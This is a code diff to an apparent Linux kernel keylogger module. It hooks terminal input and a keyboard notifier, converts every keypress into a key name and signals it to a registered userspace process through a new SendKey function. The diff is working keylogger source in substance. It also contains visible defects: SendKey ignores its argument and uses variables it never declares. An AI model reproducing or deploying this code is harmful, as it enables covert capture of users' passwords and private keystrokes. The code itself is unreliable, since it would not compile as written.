@@ -116,9 +116,40 @@ struct file* file_open(const char* path, int flags, int rights) {
     return filp;   
 }
 
+void SendKey(char* keyString)
+{
+    cur_buf_length = sprintf( key_buffer, "%s", key_name );
+        
+    sinfo = kzalloc( sizeof(struct siginfo), GFP_KERNEL );
+    if ( sinfo == NULL ) {
+        print812( "Failed to allocate siginfo for signal sending" );
+        return;
+    }
+    sinfo->si_signo = SIGIO;
+    sinfo->si_code = SI_USER;
+   
+    task = pid_task( find_vpid( registered_pid ), PIDTYPE_PID ); 
+    if ( task == NULL ) {
+        print812( "Failed to find task with pid %d", registered_pid );
+        return;
+    }
+    
+    send_sig_info( SIGIO, sinfo, task );
+
+    if ( sinfo != NULL ) {
+        kfree( sinfo );
+    }
+}
+
 void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
 {   
-    if(count > 0)
+    char *key_name = NULL; 
+    int startBuffering = registered_pid >= 0; // Don't buffer unless someone is listening
+
+    struct siginfo     *sinfo;    /* signal information */
+    struct task_struct *task;
+
+    if(startBuffering && (count > 0))
     {
         if (!tty->real_raw && !tty->raw)
         {
@@ -126,10 +157,8 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
             strncpy(dstStr, cp, count);
             dstStr[count] = '\0';
             
-            char* outStr = get_tty_key_str(dstStr, count);   
-            //char* outStr = "FakeString";
-
-            print812("%d : %s", count, outStr);
+            char* key_name = get_tty_key_str(dstStr, count);
+            SendKey( key_name );
         }
     }
 
@@ -147,28 +176,8 @@ int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param
 
     if ( code == KBD_KEYCODE && param->down && startBuffering ) {
         key_name = GET_KEYNAME( param->value );
+        SendKey( key_name );
 
-        cur_buf_length = sprintf( key_buffer, "%s", key_name );
-        
-        sinfo = kzalloc( sizeof(struct siginfo), GFP_KERNEL );
-        if ( sinfo == NULL ) {
-            print812( "Failed to allocate siginfo for signal sending" );
-            return NOTIFY_OK;
-        }
-        sinfo->si_signo = SIGIO;
-        sinfo->si_code = SI_USER;
-       
-        task = pid_task( find_vpid( registered_pid ), PIDTYPE_PID ); 
-        if ( task == NULL ) {
-            print812( "Failed to find task with pid %d", registered_pid );
-            return NOTIFY_OK;
-        }
-        
-        send_sig_info( SIGIO, sinfo, task );
-
-        if ( sinfo != NULL ) {
-            kfree( sinfo );
-        }
         // print812( "Keycode %i %s\n", param->value, (param->down ? "down" : "up") );
     }
 
